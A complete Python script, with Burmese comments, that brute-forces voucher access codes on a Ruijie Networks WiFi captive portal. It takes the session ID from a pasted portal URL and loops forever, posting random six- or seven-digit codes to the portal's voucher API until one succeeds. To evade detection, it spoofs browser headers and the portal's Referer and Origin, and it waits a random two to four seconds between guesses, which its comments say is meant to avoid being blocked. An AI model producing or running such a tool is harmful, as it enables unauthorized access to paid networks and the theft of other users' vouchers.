import requests
import random
import time
import re
from urllib.parse import urlparse

# --- [ STEALTH CONFIG ] ---
# Browser အစစ်ကနေ ပို့သလို ဟန်ဆောင်ခြင်း
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json;charset=UTF-8",
    "Referer": "https://portal-as.ruijienetworks.com/",
    "Origin": "https://portal-as.ruijienetworks.com"
}

def start_stealth_scan(portal_url):
    # SID နှင့် API URL ကို ထုတ်ယူခြင်း
    sid = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', portal_url).group(1)
    parsed = urlparse(portal_url)
    api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
    
    print(f"[*] Starting Stealth Scan... Session: {sid[:10]}")
    
    while True:
        # ဂဏန်း ၆ လုံး သို့မဟုတ် ၇ လုံး
        code = "".join([str(random.randint(0, 9)) for _ in range(random.randint(6, 7))])
        
        try:
            # Stealth Mode ဖြင့် Request ပို့ခြင်း
            response = requests.post(api_url, json={"accessCode": code, "sessionId": sid, "apiVersion": 1}, headers=HEADERS, timeout=10)
            
            # ရလဒ်ကို စစ်ဆေးခြင်း
            res_data = response.json()
            if response.status_code == 200 and "success" in response.text.lower():
                print(f"[+] FOUND WORKING CODE: {code}")
                break
            else:
                print(f"[*] Testing {code} : Result - Invalid", end="\r")
                
            # လူကိုယ်တိုင် ရိုက်နေသလို အချိန်ခြားခြင်း (အရေးကြီးဆုံးအချက်)
            # အရှိန်မြှင့်ရင် ပြန်ပိတ်ခံရပါလိမ့်မယ်
            time.sleep(random.uniform(2.0, 4.0)) 
            
        except Exception as e:
            print(f"\n[!] Error: {e}. Waiting 10s...")
            time.sleep(10)

# Browser ထဲက Link ကို ဒီမှာ ထည့်ပါ
url = input("Paste Portal URL: ")
start_stealth_scan(url)
